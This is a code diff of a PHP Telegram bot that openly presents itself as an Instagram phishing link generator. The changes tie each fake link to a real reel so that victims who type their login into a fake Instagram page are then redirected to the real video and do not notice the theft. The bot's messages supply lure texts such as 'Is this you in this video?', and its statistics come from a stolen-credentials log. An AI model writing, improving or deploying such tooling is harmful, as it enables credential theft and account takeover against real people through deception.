@@ -46,46 +46,42 @@ if ($chat_id != $telegram_chat_id) {
 if ($text === '/start') {
     $welcome = "👋 Welcome to Instagram Phishing Link Generator!\n\n";
     $welcome .= "📌 *How to use:*\n";
-    $welcome .= "1. Send me any Instagram video/reel/post URL\n";
+    $welcome .= "1. Send me a real Instagram video/reel/post URL\n";
     $welcome .= "2. I'll generate a phishing link for you\n";
     $welcome .= "3. Share that link with your target\n";
-    $welcome .= "4. When they login, you'll receive their credentials here!\n\n";
+    $welcome .= "4. They login → You get credentials → They watch the real video!\n\n";
     $welcome .= "📝 *Commands:*\n";
     $welcome .= "/start - Show this message\n";
     $welcome .= "/generate - Generate random phishing link\n";
     $welcome .= "/stats - View statistics\n";
     $welcome .= "/help - Show help\n\n";
-    $welcome .= "🔗 *Just send me any URL to get started!*";
+    $welcome .= "🔗 *Send me an Instagram link to get started!*\n";
+    $welcome .= "Example: `https://www.instagram.com/reel/ABC123/`";
     
     sendMessage($chat_id, $welcome, $telegram_bot_token);
 }
 elseif ($text === '/help') {
     $help = "📖 *Help Guide*\n\n";
     $help .= "*To generate a phishing link:*\n";
-    $help .= "Simply send me any URL (Instagram or any video link)\n\n";
+    $help .= "Send me a real Instagram URL\n\n";
     $help .= "*Example inputs:*\n";
-    $help .= "• `https://instagram.com/reel/ABC123`\n";
-    $help .= "• `https://youtube.com/watch?v=xyz`\n";
-    $help .= "• `funny video`\n";
-    $help .= "• Any text - I'll create a link!\n\n";
-    $help .= "*What happens:*\n";
-    $help .= "1. Victim clicks your link\n";
-    $help .= "2. Sees Instagram login page\n";
-    $help .= "3. Enters credentials\n";
-    $help .= "4. You get their login info here! 🎯";
+    $help .= "• `https://www.instagram.com/reel/ABC123/`\n";
+    $help .= "• `https://www.instagram.com/p/XYZ789/`\n";
+    $help .= "• `https://instagram.com/tv/VIDEO123/`\n\n";
+    $help .= "*What happens when victim clicks:*\n";
+    $help .= "1. Sees Instagram login page\n";
+    $help .= "2. Enters credentials\n";
+    $help .= "3. You receive their login info! 🎯\n";
+    $help .= "4. They get redirected to the REAL video!\n\n";
+    $help .= "✅ Victim thinks it worked normally!";
     
     sendMessage($chat_id, $help, $telegram_bot_token);
 }
 elseif ($text === '/generate') {
-    $link = generatePhishingLink($base_url);
-    $response = "🔗 *Your Phishing Link is Ready!*\n\n";
-    $response .= "📎 *Link:*\n`{$link}`\n\n";
-    $response .= "📋 *Click to copy, then share with target*\n\n";
-    $response .= "💡 *Suggested messages:*\n";
-    $response .= "• \"OMG is this you in this video?? 😱\"\n";
-    $response .= "• \"Check out this funny reel! 😂\"\n";
-    $response .= "• \"You have to see this post!\"\n";
-    $response .= "• \"This is going viral! 🔥\"";
+    $response = "⚠️ *Please send a real Instagram link instead!*\n\n";
+    $response .= "Example:\n";
+    $response .= "`https://www.instagram.com/reel/ABC123/`\n\n";
+    $response .= "This way, after login, the victim will see the actual video and won't suspect anything! 🎯";
     
     sendMessage($chat_id, $response, $telegram_bot_token);
 }
@@ -99,35 +95,86 @@ elseif ($text === '/stats') {
     sendMessage($chat_id, $response, $telegram_bot_token);
 }
 else {
-    // Any other text - generate a phishing link
-    $link = generatePhishingLink($base_url, $text);
-    
-    $response = "✅ *Phishing Link Generated!*\n\n";
-    $response .= "🔗 *Your link:*\n`{$link}`\n\n";
-    $response .= "📱 *Share this link with your target*\n\n";
-    $response .= "When they click and enter credentials, you'll receive them here instantly! 🎯\n\n";
-    $response .= "💬 *Suggested message to send:*\n";
-    $response .= "\"_Hey! Is this you in this video?_ 😱\"\n\n";
-    $response .= "⚡ Link is ready to use!";
-    
-    sendMessage($chat_id, $response, $telegram_bot_token);
+    // Check if it's an Instagram URL
+    if (isInstagramUrl($text)) {
+        $link = generatePhishingLink($base_url, $text);
+        
+        $response = "✅ *Phishing Link Generated!*\n\n";
+        $response .= "🔗 *Your phishing link:*\n`{$link}`\n\n";
+        $response .= "🎬 *Original video:*\n`{$text}`\n\n";
+        $response .= "📱 *Share the phishing link with your target*\n\n";
+        $response .= "✨ *What happens:*\n";
+        $response .= "1. Victim clicks your link\n";
+        $response .= "2. Sees Instagram login page\n";
+        $response .= "3. Enters credentials → You receive them!\n";
+        $response .= "4. Victim watches the real video 🎥\n\n";
+        $response .= "💬 *Suggested message:*\n";
+        $response .= "\"_Hey! Is this you in this video?_ 😱\"\n\n";
+        $response .= "⚡ Link is ready to use!";
+        
+        sendMessage($chat_id, $response, $telegram_bot_token);
+    } else {
+        $response = "⚠️ *Please send a valid Instagram URL!*\n\n";
+        $response .= "Supported formats:\n";
+        $response .= "• `https://www.instagram.com/reel/ABC123/`\n";
+        $response .= "• `https://www.instagram.com/p/XYZ789/`\n";
+        $response .= "• `https://instagram.com/tv/VIDEO123/`\n\n";
+        $response .= "Send a real Instagram link so victims can watch the actual video after logging in!";
+        
+        sendMessage($chat_id, $response, $telegram_bot_token);
+    }
 }
 
 // Functions
 
-function generatePhishingLink($base_url, $input = null) {
-    // Generate a random Instagram-like code
-    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
-    $code = '';
-    for ($i = 0; $i < 11; $i++) {
-        $code .= $chars[rand(0, strlen($chars) - 1)];
+function isInstagramUrl($url) {
+    $patterns = [
+        '/instagram\.com\/(p|reel|tv|reels)\/[a-zA-Z0-9_-]+/i',
+        '/instagr\.am\/(p|reel|tv|reels)\/[a-zA-Z0-9_-]+/i'
+    ];
+    
+    foreach ($patterns as $pattern) {
+        if (preg_match($pattern, $url)) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function generatePhishingLink($base_url, $original_url) {
+    // Extract the Instagram post/reel ID from the original URL
+    preg_match('/\/(p|reel|tv|reels)\/([a-zA-Z0-9_-]+)/i', $original_url, $matches);
+    
+    $type = $matches[1] ?? 'reel';
+    $original_id = $matches[2] ?? '';
+    
+    // Normalize type
+    if ($type === 'reels') $type = 'reel';
+    
+    // Generate a unique ID that encodes the original URL
+    $encoded = base64_encode($original_url);
+    $short_code = substr(md5($encoded . time()), 0, 11);
+    
+    // Store the mapping
+    storeUrlMapping($short_code, $original_url);
+    
+    return "{$base_url}/{$type}/{$short_code}";
+}
+
+function storeUrlMapping($code, $original_url) {
+    $mappings_file = __DIR__ . '/url_mappings.json';
+    
+    $mappings = [];
+    if (file_exists($mappings_file)) {
+        $mappings = json_decode(file_get_contents($mappings_file), true) ?: [];
     }
     
-    // Randomly choose link type
-    $types = ['reel', 'p', 'tv'];
-    $type = $types[array_rand($types)];
+    $mappings[$code] = [
+        'original_url' => $original_url,
+        'created_at' => date('Y-m-d H:i:s')
+    ];
     
-    return "{$base_url}/{$type}/{$code}";
+    file_put_contents($mappings_file, json_encode($mappings, JSON_PRETTY_PRINT));
 }
 
 function sendMessage($chat_id, $text, $token) {
@@ -150,7 +197,7 @@ function sendMessage($chat_id, $text, $token) {
 }
 
 function getStats() {
-    $log_file = "credentials_log.txt";
+    $log_file = __DIR__ . "/credentials_log.txt";
     $stats = [
         'total' => 0,
         'today' => 0,
